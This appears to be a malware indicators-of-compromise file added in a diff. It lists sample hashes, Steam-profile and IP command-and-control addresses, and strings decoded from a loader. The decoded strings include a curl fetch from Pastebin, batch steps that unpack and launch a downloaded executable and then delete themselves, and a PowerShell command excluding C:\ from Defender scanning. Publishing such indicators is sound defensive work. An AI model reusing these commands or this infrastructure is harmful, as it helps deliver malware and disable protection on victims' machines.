@@ -1,0 +1,113 @@
+Samples:
+
+dbb0d70e1b41f8abad8213ee29ef7d18
+ab034649ddff106422f7c4c625f612c2
+7e46a12fd69f979a040d1f09cb1ce21f
+0635665e633dfb5091eba240e55eb3bb
+4005a9e6d787d44e8ab8a44ee5a90eca
+7d8594396d66f2d26d4fd223b186ea95
+76db3bcc0a5f16d35eac53feff1b6bee
+ad7ee71a42b0b9edeb5f7e76f5559213
+69d326eadce9b4ad47cd4dddcf9a683a
+c812bf971ddc915a708f2f94e8ebe79e
+9c6352ad45c6ce5ab18f75f4fcf3c85d
+dd7fa15e22c739c63a092bee501ddc33
+4c0e235b42b87eb9cec0309fcbb0bc07
+eca50d271b1f60113efd31b1fff68820
+faff08b2b9d859a2ee679a26ede9c88c
+663bb4b54c7bfffed5892a124f2a59ca
+81afe7ade32049b63e52d80e0664637b
+0d7d55a51c9e675894fa6ec3fb0fc9c4
+d4e7633e72150450611a0014990bc7aa
+5057a49dc609566eef2e0cb2694a716a
+fc3c25e2b42f389e08a6c62c6efc630a
+3f131273aa8ef454fbe363ce72914ce2
+609c6aedf1f2a17cd7121bf1e6e8560a
+be155f71adb02a8651f3fcf3c7552876
+9f5c73490652c9210a4b6b59c7d7d9c0
+09aaf93d55b126e5821cc5be6fb88edc
+2039f1c01919fb73323545e507ecdffc
+66771551b2ca114649a230b6c7d7a5a1
+209336a96be9e2adf39512a6871b428e
+d8d410046878c7e17bee7d9be570008b
+f6f2f87726336d1d9f799ea0a8d66143
+56a25a8434eab0c37f91c59110118360
+9f33d70896a2cd0caed898046df1fa3e
+8d62acef84bc2ac5edcc780d06c18df5
+ba272ffe2ed73feafbe06fa80893e7b2
+fdc3b66311cd19524c14db567bc9b140
+b57fc205e3003af6ada1b6792aafe526
+bdaa3c576cd2db43cb02cb251c3aab79
+1ce38348eed2fa316fc8c4bc2e569800
+3817f072513bed18c8c3053b58a7318b
+bd6de8137f4de9b4cad066e91b01198a
+1a7a148328ab1b82fc4ac77985bb5823
+79211d4f9dc8fc04495e7a783ca6607f
+acb98ed0b761187711a7dc03ad78dcdd
+84f952f31a13574a5dd180898b3b09c9
+2806515d9d7bec22fd3205da5faa66bb
+c34d240bbf935b76fce0f0955d72ff27
+0a154e3d1a4b2109cc72bbe3621c0487
+86ca2fb6e7cbb0f38f4e2d763ea02ac1
+4ef5d460b53d7354ef557a31ef45aed4
+c86d03848e767efcaf8ea495749d7c0b
+815b3c88950fd572bb4bfef96d2ca23d
+8680acc7fd6b015307fcfb87bc71e8ba
+71d61882d77ca842d1febb64424de899
+92ff8f7df379b79d1e6dc4ad9cd5be7b
+c0230d748e61819d9dfad0da03fe6ec8
+3b371305be63500f4011b5fbcf650c78
+75362ffbcf50e201847700b263f7149f
+c1dee5a859392cbdd77a4bd32c21db89
+9daaada6b1b4932c43a932a7b280dad3
+83f44acc6948b36f3728b76aa13dead1
+956045388c11142cfeeca327aaf28961
+17af51265211f359f047f26598862c54
+1e36587cf554d6329da4ca2a669bb15e
+7299d114edec45350777b2261493c948
+eeecd08e619d52300a839766fe162652
+8584f9e66cfb59fd07260cff63525293
+901c839023ef9f092264047793d43f52
+9c8147dbc86c878751258f5340e79313
+2c91c20bfd5d6947680a6c8c9e4ce3f9
+
+C2s:
+
+https://steamcommunity.com/profiles/76561199675758951
+https://steamcommunity.com/profiles/76561199689894251
+https://steamcommunity.com/profiles/76561199662282318
+
+78.47.105.28
+5.75.215.51 
+5.75.214.104
+5.75.213.183 
+88.198.193.148 
+50.75.213.183 
+88.198.124.238 
+49.12.115.57
+49.12.115.59 
+116.203.8.165
+88.198.89.4  
+116.202.0.236
+116.202.5.195
+78.47.105.28  
+5.75.232.183 
+159.69.26.61 
+
+Custom base64-decoded strings:
+
+['{pf64}\\Windows NT', 'curl https://pastebin.com/raw/ZmJsLQWU>url.txt', '{tmp}', '{tmp}\\courier.cmd', '@echo off', 'DEL /F /Q ""%~f0""&EXIT >nul', '{tmp}\\courier.cmd', '{tmp}\\url.txt', '{pf64}\\Windows NT\\85.zip', '/manual/125/125.zip', '{pf64}\\Windows NT\\performer.cmd', 'if exist "%src%\\125\\125.exe" start /w "" "%src%\\125\\125.exe"', 'cmd /c rd "%src%\\125"', 'cmd /c del "%src%\\85.zip"', 'cmd /c del "%src%\\performer.cmd"', 'cmd /c tar xf 85.zip', "cmd /c powershell -inputformat none -outputformat none -NonInteractive -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath 'C:\\'", 'timeout /t 8', '{pf64}\\Windows NT', 'cmd /c tar xf 85.zip', '{pf64}\\Windows NT\\performer.cmd']
+
+Decrypted strings from the sample using Ceasar Cipher:
+
+['https://steamcommunity.com/profiles/76561199675758951',
+ 'https://nm4ing.db.files.1drv.com/y4m7G3_Tpw-btOP_YQtOLeq-1ayHGyFqTGUANAyF3IYda_U6pQNQJrXJLLlE86zyDBblAL_qj9lsGP5Tv1HRdbtxBKcz5-_NS2iXmLda8Ho3ZQbf6QFniYulPYXAJZLVYwh4W4ujtgzMwsASM6SeqFCeuJ5PEn0W6S29lyr6fD5bTRDq3pIhkJK4wgs5dN6FE_leejOS_a1JFtx-0Y8FRkeUA',
+ 'https://anydka.am.files.1drv.com/y4mTkcpWXIOe5BH_-PzjZwJ4hBQEVAQjkV7U8Lg7vFQaD89mT5G5V6xXOiyaEFwNSyjUnD-2cv1MTVnPt3FRiE-galC-RwQNakya5iUq8mh6gellHKrTLxF0ROoQj6ges1CVGNo4UgxfizLMUhPUWJ_1RMj2R7Xv2rs48GUIuIW178i4wvd8DIrqris1CsCGBLRTYAE43WzEll0tzbuGvbnjw',
+ '{pf64}\\Windows NT\\21.txt',
+ '{pf64}\\Windows NT\\21.cmd',
+ '{pf64}\\Windows NT\\85.zip',
+ '{pf64}\\Windows NT\\4554.cmd',
+ '{pf64}\\Windows NT',
+ '/manual/213/213']
+ 
+ 
